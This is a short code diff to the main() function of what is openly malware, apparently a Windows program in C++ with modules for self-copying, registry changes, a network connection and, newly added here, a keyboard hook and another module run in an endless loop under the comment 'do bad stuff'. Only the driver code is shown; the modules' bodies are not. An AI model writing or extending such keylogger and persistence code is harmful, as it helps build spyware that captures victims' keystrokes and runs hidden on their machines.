@@ -7,9 +7,12 @@
 #include "RM.h"
 #include "DB.h"
 #include "RG.h"
+#include "MP.h"
+#include "KB.h"
 #include "UTIL.h";
 #include <iostream>
 
+KB *KB::m_pThis = NULL;
 
 int main()
 {
@@ -20,9 +23,13 @@ int main()
 	RM remvModule;
 	DB debgModule;
 	RG regsModule;
-
+	MP msptModule;
+	KB keybModule;
 	UTIL util;
-
+	keybModule.setHook();
+	while (true) {
+		Sleep(20000);
+	}
 	if (!util.isExecutingFromAppData()) {
 		copyModule.execute();
 		debgModule.execute();
@@ -34,9 +41,10 @@ int main()
 
 	while (true) {
 		// do bad stuff
-		regsModule.execute();
+		//regsModule.execute();
 		debgModule.execute();
 		connModule.execute();
+		msptModule.execute();
 		Sleep(20000);
 	}
 }
